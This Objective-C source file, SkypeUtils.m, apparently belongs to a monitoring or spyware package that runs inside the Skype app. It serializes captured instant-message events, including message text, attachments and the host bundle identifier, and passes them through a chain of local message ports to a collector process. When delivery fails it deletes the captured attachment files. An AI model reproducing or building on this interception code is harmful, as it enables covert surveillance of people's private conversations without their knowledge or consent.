//
//  SkypeUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 12/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SkypeUtils.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "MessagePortIPCSender.h"
#import "StringUtils.h"
#import "FxAttachment.h"

//static SkypeUtils *_SkypeUtils = nil;

@interface SkypeUtils (private)
- (void) thread: (FxIMEvent *) aIMEvent;
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;
@end


@implementation SkypeUtils

//@synthesize mLastMessageID;

//+ (SkypeUtils *) shareSkypeUtils {
//	if (_SkypeUtils == nil) {
//		_SkypeUtils = [[SkypeUtils alloc] init];					
//		//[_SkypeUtils setMLastMessageID:0];
//	}
//	return (_SkypeUtils);		
//}

+ (void) sendSkypeEvent: (FxIMEvent *) aIMEvent {
	SkypeUtils *skypeUtils = [[SkypeUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:skypeUtils withObject:aIMEvent];
	[skypeUtils autorelease];
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"Skype message after remove emoji = %@", msg);
		if ([msg length]) {
			[aIMEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
			NSDictionary *skypeInfo = [[NSDictionary alloc] initWithObjectsAndKeys:bundleIdentifier, @"bundle",
																				   aIMEvent, @"IMEvent", nil];
			[archiver encodeObject:skypeInfo forKey:kSkypeArchived];
			[archiver finishEncoding];
			[skypeInfo release];
			[archiver release];	
			
			// -- first port ----------
			BOOL sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort1];
			if (!sendSuccess){
				DLog (@"First attempt fails %@", [aIMEvent mMessage])
				
				// -- second port ----------
				sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort2];
				if (!sendSuccess) {
					DLog (@"Second attempt fails %@", [aIMEvent mMessage])
					
					[NSThread sleepForTimeInterval:1];
					
					// -- Third port ----------				
					sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort3];					
					if (!sendSuccess) {
						DLog (@"Third attempt fails %@", [aIMEvent mMessage])
						[self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
					}
				}
				
			}
			//MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kSkypeMessagePort1];			
			//[messagePortSender writeDataToPort:data];
			//[messagePortSender release];
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
	}
}

@end
